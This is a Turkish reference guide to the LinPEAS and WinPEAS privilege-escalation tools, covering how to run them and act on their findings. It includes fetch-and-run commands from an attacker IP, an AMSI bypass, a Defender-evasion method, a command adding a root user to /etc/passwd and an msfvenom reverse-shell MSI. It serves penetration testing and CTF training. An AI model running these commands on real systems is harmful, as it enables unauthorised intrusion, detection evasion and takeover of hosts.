# 🦹 PEASS-ng (LinPEAS & WinPEAS) - Kapsamlı Başvuru Kılavuzu

[🇺🇸 English Version](../README.md)

```
  ██████╗ ███████╗ █████╗ ███████╗███████╗      ███╗   ██╗ ██████╗ 
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝      ████╗  ██║██╔════╝ 
  ██████╔╝█████╗  ███████║███████╗███████╗█████╗██╔██╗ ██║██║  ███╗
  ██╔═══╝ ██╔══╝  ██╔══██║╚════██║╚════██║╚════╝██║╚██╗██║██║   ██║
  ██║     ███████╗██║  ██║███████║███████║      ██║ ╚████║╚██████╔╝
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝      ╚═╝  ╚═══╝ ╚═════╝ 
             LinPEAS & WinPEAS Privilege Escalation Suite
```

<p align="center">
  <img src="https://img.shields.io/badge/PEASS--ng-PrivEsc-red?style=for-the-badge" alt="PEASS-ng">
  <img src="https://img.shields.io/badge/LinPEAS-Linux_PrivEsc-blue?style=for-the-badge" alt="LinPEAS">
  <img src="https://img.shields.io/badge/WinPEAS-Windows_PrivEsc-orange?style=for-the-badge" alt="WinPEAS">
  <img src="https://img.shields.io/badge/Automated-Enumeration-green?style=for-the-badge" alt="Automated">
</p>

<p align="center">
  <b>🔍 Linux ve Windows sistemlerinde yerel yetki yükseltme açıklarını tespit eden dünyanın en popüler otomatik denetim araçları</b>
</p>

---

## 📋 İçindekiler

- [Giriş](#-giriş)
- [Renk Lejantı ve Çıktıyı Okuma](#-renk-lejantı-ve-çıktıyı-okuma)
- [LinPEAS (Linux Yetki Yükseltme)](#-linpeas-linux-yetki-yükseltme)
  - [İndirme ve Bellekte Çalıştırma](#i̇ndirme-ve-bellekte-çalıştırma)
  - [Komut Satırı Parametreleri](#komut-satırı-parametreleri)
  - [LinPEAS Tarafından Denetlenen Temel Vektörler](#linpeas-tarafından-denetlenen-temel-vektörler)
  - [Gizlilik ve AV Atlatma](#gizlilik-ve-av-atlatma)
- [WinPEAS (Windows Yetki Yükseltme)](#-winpeas-windows-yetki-yükseltme)
  - [Çalıştırma Yöntemleri (.exe ve .bat)](#çalıştırma-yöntemleri-exe-ve-bat)
  - [WinPEAS'ı Bellekte Çalıştırma](#winpeası-bellekte-çalıştırma)
  - [WinPEAS Tarafından Denetlenen Temel Vektörler](#winpeas-tarafından-denetlenen-temel-vektörler)
  - [Windows Defender ve AMSI'yi Atlatma](#windows-defender-ve-amsiyi-atlatma)
- [Kritik Bulguların Yorumlanması ve İstismarı](#-kritik-bulguların-yorumlanması-ve-i̇stismarı)
- [Hızlı Referans Tablosu](#-hızlı-referans-tablosu)
- [İpuçları ve En İyi Pratikler](#-i̇puçları-ve-en-i̇yi-pratikler)
- [Yasal Uyarı](#-yasal-uyarı)
- [Kaynaklar](#-kaynaklar)

---

## 🎯 Giriş

**PEASS-ng** (Privilege Escalation Awesome Scripts SUITE - new generation), Carlos Polop tarafından geliştirilen, ele geçirilen sistemlerde yerel yetki yükseltme (privilege escalation) yollarını keşfetmek için kullanılan sektör standardı otomatik analiz aracıdır:

- **LinPEAS:** Linux/Unix sistemlerde hatalı yapılandırmaları, kayıtlı parolaları, yazılabilir dosyaları, SUID ikililerini, çekirdek açıklarını, zamanlanmış görevleri (cron) ve konteynerleri denetleyen hepsi bir arada Bash betiğidir.
- **WinPEAS:** Windows iş istasyonları, etki alanı istemcileri ve sunucuları denetlemek için derlenmiş .NET ikilileri (`winPEASany.exe`, `winPEASx64.exe`) ve hafif toplu işlem betiği (`winPEAS.bat`) olarak sunulur.

---

## 🎨 Renk Lejantı ve Çıktıyı Okuma

PEASS araçlarının en güçlü özelliği, bulguları önem derecesine göre renklendirmesidir:

| Renk | Önem Derecesi | Anlamı |
|------|---------------|--------|
| 🔴 **KIRMIZI/SARI** | 🚨 **KRİTİK (%99 Yetki Yükseltme)** | Neredeyse kesin bir yetki yükseltme açığıdır. İlk incelenmesi gereken noktadır! |
| 🔴 **KIRMIZI** | ⚠️ **Dikkat Çekici** | Standart dışı yapılandırma, olağan dışı izin veya kimlik bilgisi adayı. |
| 🟡 **SARI** | ℹ️ **Bilgilendirici** | Bir istismar zincirinin parçası olabilecek önemli bulgu. |
| 🔵 **AÇIK MAVİ / MAVİ**| 👥 **Bağlam Bilgisi** | Kullanıcılar, gruplar ve standart sistem bilgileri. |

> **Altın Kural:** Çıktıyı incelerken doğrudan **KIRMIZI/SARI** (sarı arka plan üstüne kırmızı yazı) vurgulara odaklanın! Bu renk kombinasyonunu gördüğünüzde hedefte kök/yönetici yetkisine geçiş yolu neredeyse hazırdır.

---

## 🐧 LinPEAS (Linux Yetki Yükseltme)

### İndirme ve Bellekte Çalıştırma

`linpeas.sh` dosyasını diske kaydetmeden doğrudan bellekte çalıştırmak en temiz yöntemdir:

```bash
# 1. Saldırgan web sunucusundan doğrudan belleğe çekip çalıştırma
curl -L http://10.10.14.5:8000/linpeas.sh | sh

# wget alternatifi
wget -q -O - http://10.10.14.5:8000/linpeas.sh | sh

# 2. Resmi GitHub sürümünden doğrudan çalıştırma (hedefin internet erişimi varsa)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 3. Çıktıyı renkleri koruyarak bir dosyaya kaydetme
./linpeas.sh -a > /tmp/linpeas.txt
less -r /tmp/linpeas.txt
```

### Komut Satırı Parametreleri

```bash
# Tüm denetimleri kapsamlı çalıştır (derin dosya aramaları dahil)
./linpeas.sh -a

# Hızlı mod (yavaş çalışan derin regex/dosya aramalarını atlar)
./linpeas.sh -q

# Otomatik 'sudo -l' denetimi için kullanıcı parolası sağlama
./linpeas.sh -p 'Parola123'

# Yalnızca ağ denetimlerini çalıştır (dinlenen portlar, ARP tablosu, bağlantılar)
./linpeas.sh -N

# Yalnızca sistem bilgilerini göster
./linpeas.sh -s
```

### LinPEAS Tarafından Denetlenen Temel Vektörler

1. **Sudo Yapılandırma Hataları (`sudo -l`):**
   - Parolasız root olarak çalıştırılabilen komutlar (`NOPASSWD`).
   - Sudo token yeniden kullanımı / CVE-2021-3156 (Baron Samedit).
2. **SUID / SGID İkilileri:**
   - Root yetkisiyle çalışan dosyalar (`chmod +s`). Bu ikililer doğrudan **GTFOBins** veritabanı ile eşleştirilir.
3. **Linux Yetenekleri (Capabilities):**
   - `cap_setuid+ep` gibi tehlikeli izinlere sahip ikililer (`python3`, `tar`, `perl` vb.).
4. **Zamanlanmış Görevler (Cron & Timers):**
   - `/etc/crontab`, `/var/spool/cron/*` ve yazılabilir betikler.
   - Systemd zamanlayıcıları (`systemctl list-timers`).
5. **PATH ve Ortam Değişkeni İstismarı:**
   - `$PATH` içinde yazılabilir dizinler veya betiklerde göreceli komut çağrıları.
6. **Çekirdek (Kernel) Açıkları:**
   - İşletim sistemi çekirdek sürümü (Dirty COW, Dirty Pipe, OverlayFS açıklarına karşı).
7. **NFS Root Squashing:**
   - `/etc/exports` içinde `no_root_squash` ile paylaşılan ağ dizinleri.
8. **Parola ve Kimlik Bilgisi Avı:**
   - `.bash_history` dosyaları, konfigürasyon dosyaları (`wp-config.php`, `.env`), SSH özel anahtarları (`id_rsa`).

---

## 🪟 WinPEAS (Windows Yetki Yükseltme)

### Çalıştırma Yöntemleri (.exe ve .bat)

WinPEAS farklı ortamlara uygun biçimlerde sunulur:
- **`winPEASx64.exe` / `winPEASany.exe`:** C#/.NET ile yazılmıştır. En kapsamlı sürüm olup derin kayıt defteri (Registry), API ve kimlik denetimleri yapar.
- **`winPEAS.bat`:** Sade toplu işlem betiğidir. .NET bağımlılığı gerektirmez, eski Windows sürümlerinde çalışır ve statik ikili tespitlerini atlatır.

```cmd
:: Renkli tam çıktı ile çalıştırma
winPEASx64.exe

:: Çıktıyı dosyaya yönlendirme
winPEASx64.exe > C:\Windows\Temp\out.txt

:: Sessiz ve hızlı mod
winPEASx64.exe quiet
```

### WinPEAS'ı Bellekte Çalıştırma

Hedef makinede diske dosya yazmaktan kaçınmak için PowerShell oturumunda doğrudan belleğe yükleyin:

```powershell
# Net.WebClient ile belleğe yükleyip çalıştırma
$pe = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.5:8000/winPEASx64.exe')
[System.Reflection.Assembly]::Load($pe)
[winPEAS.Program]::Main("")
```

### WinPEAS Tarafından Denetlenen Temel Vektörler

1. **Servis İzinleri ve Tırnaksız Servis Yolları (Unquoted Service Paths):**
   - Boşluk içeren ve tırnak içine alınmamış servis yolları (`C:\Program Files\App\servis.exe` -> araya `C:\Program.exe` yerleştirme).
   - Zayıf servis izinleri (`SERVICE_ALL_ACCESS`, `SERVICE_CHANGE_CONFIG`).
2. **DLL Hijacking:**
   - Servislerin yazılabilir kullanıcı dizinlerinden yüklemeye çalıştığı eksik DLL'ler.
3. **AlwaysInstallElevated:**
   - Kayıt defterinde `AlwaysInstallElevated = 1` değerinin bulunması (düşük yetkili kullanıcının `msiexec` ile root haklarında MSI kurabilmesi).
4. **Token Ayrıcalıkları (SeImpersonate / SeAssignPrimaryToken):**
   - Potato ailesi istismarları (SweetPotato, GodPotato, PrintSpoofer) ile servis hesaplarından (`IIS APPPOOL`, `LOCAL SERVICE`) doğrudan `NT AUTHORITY\SYSTEM` yetkisine yükselme.
5. **Kayıtlı Kimlik Bilgileri ve Autologon:**
   - Kayıt defterinde açık metin parolalar (Winlogon `DefaultPassword`).
   - Kayıtlı RDP oturumları, Windows Vault, DPAPI verileri, PuTTY oturumları.
6. **SAM ve SYSTEM Yedek Dosyaları:**
   - `C:\Windows\Repair\SAM` veya `RegBack\SAM` dosyalarının okunabilir olması.

### Windows Defender ve AMSI'yi Atlatma

Windows Defender, derlenmiş standart `winPEASx64.exe` dosyalarını tespit edebilir. İzlenen sistemlerde:

```powershell
# 1. PowerShell AMSI korumasını bellek üzerinde devre dışı bırakın:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 2. Veya derleme gerektirmeyen winPEAS.bat sürümünü tercih edin:
curl.exe http://10.10.14.5:8000/winPEAS.bat -o %TEMP%\wp.bat && %TEMP%\wp.bat
```

---

## 🎯 Kritik Bulguların Yorumlanması ve İstismarı

### 1. LinPEAS: Yazılabilir `/etc/passwd`
LinPEAS `/etc/passwd` dosyasını **KIRMIZI/SARI** olarak işaretlerse:
```bash
# Parola hash'i üretin:
openssl passwd -1 -salt evil SaltPass123
# Root yetkisinde yeni kullanıcı ekleyin:
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
```

### 2. WinPEAS: `SeImpersonatePrivilege` Tespit Edildiğinde
Elinizde `SeImpersonatePrivilege` ayrıcalığı varsa:
```powershell
# GodPotato veya PrintSpoofer ile SYSTEM kabuğu alın:
.\GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
```

### 3. WinPEAS: `AlwaysInstallElevated` Değeri 1 İse
```powershell
# Ters kabuk içeren zararlı MSI paketi üretin:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o priv.msi
# Düşük yetkili kullanıcı ile yükleyin:
msiexec /quiet /qn /i priv.msi
```

---

## 📊 Hızlı Referans Tablosu

| Hedef | Komut | Amaç |
|-------|-------|------|
| **Linux (Uzak Bellek)** | `curl -L http://<IP>/linpeas.sh \| sh` | Diske yazmadan bellekte çalıştırma |
| **Linux (Yerel)** | `./linpeas.sh -a > out.txt` | Çıktıyı dosyaya kaydetme |
| **Linux (Hızlı)** | `./linpeas.sh -q` | Yavaş aramaları atlayarak hızlı tarama |
| **Windows (CLI)** | `winPEASx64.exe quiet` | Gereksiz gürültüyü azaltan hızlı tarama |
| **Windows (Bellek)** | `[System.Reflection.Assembly]::Load($pe)` | PowerShell ile bellekte çalıştırma |
| **Windows (Batch)** | `winPEAS.bat` | Bağımlılıksız ve AV atlatma amaçlı çalıştırma |

---

## 💡 İpuçları ve En İyi Pratikler

1. **Çıktıyı `less -r` ile İnceleyin:**
   Çıktıyı bir dosyaya yönlendirdiğinizde (`./linpeas.sh > linpeas.txt`), ANSI renk kodlarının doğru görüntülenmesi için dosyayı daima `less -r linpeas.txt` ile açın.
2. **Araçları 80/443 Portundan Sunun:**
   Saldırgan makinenizde `python3 -m http.server 80` ile sunucu açarsanız, hedefin güvenlik duvarı giden bağlantı kurallarını kolayca aşarsınız.
3. **Gizli Kimlik Bilgilerini Atlamayın:**
   LinPEAS çıktısındaki "Interesting Files" ve "Cloud Credentials" bölümlerini mutlaka inceleyin; açıkta unutulan API token'ları çoğu zaman yerel çekirdek açıklarından daha hızlı sonuç verir.

---

## ⚠️ Yasal Uyarı

> **ÖNEMLİ:** PEASS-ng betikleri sistem üzerinde derinlemesine denetim yapar. Yalnızca yazılı izin alınmış penetrasyon testlerinde, CTF platformlarında ve yetkili güvenlik denetimlerinde çalıştırılmalıdır.

---

## 📚 Kaynaklar

- [PEASS-ng Resmi GitHub Deposu](https://github.com/carlospolop/PEASS-ng)
- [HackTricks Yetki Yükseltme Dokümantasyonu](https://book.hacktricks.xyz/)
- [GTFOBins - Unix İkilileri İstismarı](https://gtfobins.github.io/)
- [LOLBAS - Windows Dahili İkilileri İstismarı](https://lolbas-project.github.io/)
